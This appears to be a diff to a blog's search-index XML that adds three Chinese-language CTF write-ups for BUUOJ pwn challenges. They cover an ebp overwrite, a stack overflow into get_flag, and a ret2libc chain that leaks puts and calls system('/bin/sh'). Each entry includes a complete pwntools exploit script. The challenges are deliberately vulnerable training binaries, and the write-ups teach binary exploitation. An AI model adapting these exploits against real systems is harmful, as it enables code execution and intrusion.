@@ -4,6 +4,87 @@
   
   
   <entry>
+    <title>pwnable_simple_login</title>
+    <link href="/2023/04/24/ctf-pwn/pwnable_simple_login/"/>
+    <url>/2023/04/24/ctf-pwn/pwnable_simple_login/</url>
+    
+    <content type="html"><![CDATA[<p><strong>题目</strong></p><p><a href="https://buuoj.cn/challenges#pwnable_simple_login">https://buuoj.cn/challenges#pwnable_simple_login</a></p><p><strong>方法</strong></p><p>程序流程</p><ol><li>读入一个字符串，进行base64解密</li><li>解密结果不能超过12字节</li><li>对解密结果进行md5加密，比对加密结果</li><li>执行system</li></ol><p>main函数读取char30的输入显然是没有漏洞的</p><p><img src="/img/pwnable_simple_login/1.jpg"></p><p>B64Decode这个函数我也没太看懂，BIO_XXX这些函数我也不了解，就当它解码出来了吧（</p><p>然后把解码的内容放到input这个全局变量里，然后在auth的时候又使用了这个input</p><p><img src="/img/pwnable_simple_login/2.jpg"></p><p>auth里v4只有8字节，因此可以使用12字节的input溢出到ebp里</p><p>能够只溢出ebp就能控制执行流程的原理在于，此函数返回之后，上一级函数的栈底会被修改，而程序会通过自定义的这个栈底地址，+4去找到这个上级函数的返回地址，因此变相实现了返回地址的控制。</p><p>本题目中将ebp指向input，那么input+4设置为correct函数地址就可以完成溢出</p><p>另外，correct会验证前input前四个字节是不是deadbeef，因此payload由<code>0xdeadbeef</code>，<code>correct_addr</code>，<code>inputs_addr</code>三部分组成。</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./login&#x27;</span>)<br><br>correct = <span class="hljs-number">0x804925f</span><br>inputs = <span class="hljs-number">0x811eb40</span><br>payload = base64.b64encode(p32(<span class="hljs-number">0xdeadbeef</span>) + p32(correct) + p32(inputs))<br>p.recv()<br>sleep(<span class="hljs-number">0.5</span>)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf-pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf-pwn</tag>
+      
+      <tag>exp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>get_started_3dsctf_2016</title>
+    <link href="/2023/04/21/ctf-pwn/get_started_3dsctf_2016/"/>
+    <url>/2023/04/21/ctf-pwn/get_started_3dsctf_2016/</url>
+    
+    <content type="html"><![CDATA[<p><strong>题目</strong></p><p><a href="https://buuoj.cn/challenges#get_started_3dsctf_2016">https://buuoj.cn/challenges#get_started_3dsctf_2016</a></p><p>一道十分简单的栈溢出，将main的返回地址移交给自带的get_flag函数</p><p>把这道题列出来的原因在于，程序没有开启标准输入输出，</p><p>如果单纯执行完get_flag不设置一个正确的返回地址，这个函数里的输出显示不出来</p><p>（详细原因目前也不是很清楚）</p><p><strong>Exp</strong></p><p>针对上述问题，选择exit函数作为get_flag的返回地址（不能放一个空着的p32(0)进去）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,27230)</span><br>p = process(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br><br>get_flag = <span class="hljs-number">0x80489A0</span><br>param1 = <span class="hljs-number">0x308CD64F</span><br>param2 = <span class="hljs-number">0x195719D1</span><br><br>sleep(<span class="hljs-number">0.1</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span> + p32(get_flag) +p32(<span class="hljs-number">0x0804E6A0</span>) + p32(param1) + p32(param2)<br><br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf-pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf-pwn</tag>
+      
+      <tag>exp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>bjdctf_2020_babyrop</title>
+    <link href="/2023/04/21/ctf-pwn/bjdctf_2020_babyrop/"/>
+    <url>/2023/04/21/ctf-pwn/bjdctf_2020_babyrop/</url>
+    
+    <content type="html"><![CDATA[<p><strong>题目</strong></p><p><a href="https://buuoj.cn/challenges#bjdctf_2020_babyrop">https://buuoj.cn/challenges#bjdctf_2020_babyrop</a></p><p>非常基本的一道利用puts函数构造rop链泄露libc基址的题目</p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25323</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)<br><br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>poprdi_ret = <span class="hljs-number">0x400733</span><br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>s = p.recv()<br><span class="hljs-built_in">print</span>(s)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)<br><br>p.sendline(payload)<br><br>s = p.recv()<br><br>puts_addr = u64(s[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc =LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>offset = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>binsh = offset + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span> + p64(poprdi_ret) + p64(binsh) + p64(system)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf-pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf-pwn</tag>
+      
+      <tag>exp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>HarekazeCTF2019 baby_rop2</title>
     <link href="/2023/04/21/ctf-pwn/%5BHarekazeCTF2019%5Dbaby_rop2/"/>
     <url>/2023/04/21/ctf-pwn/%5BHarekazeCTF2019%5Dbaby_rop2/</url>
